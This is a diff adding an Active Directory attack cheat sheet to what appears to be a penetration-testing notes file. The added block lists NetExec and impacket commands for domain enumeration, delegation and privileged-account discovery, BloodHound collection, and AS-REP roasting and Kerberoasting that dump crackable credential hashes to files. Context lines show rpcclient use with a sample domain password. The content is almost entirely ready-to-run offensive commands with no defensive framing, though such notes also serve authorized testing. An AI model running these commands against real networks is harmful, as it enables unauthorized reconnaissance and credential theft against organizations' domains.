@@ -427,3 +427,100 @@ enum4linux -a target                  # Enumerate shares/users 🔍
 199. rpcclient -U "fakeorg.local\john.doe%'Passw0rd123!'" 192.168.1.100
 200. net view \\192.168.1.100 /all
 ```
+```
+extra
+# =========================
+# BASIC ENUMERATION
+# =========================
+
+# Domain info
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain>
+
+# List users
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --users
+
+# Export users
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --users-export users.txt
+
+# List groups
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --groups
+
+# List computers (VERY IMPORTANT)
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --computers
+
+# Domain Controllers
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --dc-list
+
+
+# =========================
+# PRIVILEGE & MISCONFIG ENUM
+# =========================
+
+# Delegation (important for attacks)
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --find-delegation
+
+# Unconstrained delegation
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --trusted-for-delegation
+
+# AdminCount = 1 users (privileged)
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --admin-count
+
+# Users with no password requirement
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --password-not-required
+
+# Active users
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --active-users
+
+
+# =========================
+# KERBEROS ATTACK ENUM
+# =========================
+
+# AS-REP roastable users
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --asreproast asrep.txt
+
+# Kerberoastable users
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --kerberoasting kerberoast.txt
+
+
+# =========================
+# gMSA ENUMERATION
+# =========================
+
+# List gMSA accounts
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --gmsa
+
+# Convert gMSA SID
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --gmsa-convert-id <ID>
+
+
+# =========================
+# BLOODHOUND COLLECTION
+# =========================
+
+# Full BloodHound data
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --bloodhound -c all
+
+
+# =========================
+# IMPACKET (ALTERNATIVE)
+# =========================
+
+# Get SPNs (Kerberoast)
+impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <IP>
+
+# Request TGS hash
+impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <IP> -request
+
+# AS-REP roast
+impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass
+
+
+# =========================
+# CUSTOM LDAP QUERY
+# =========================
+
+# Custom LDAP query
+nxc ldap <IP> -u <user> -p '<pass>' -d <domain> \
+--query "(objectClass=user)" "sAMAccountName"
+```
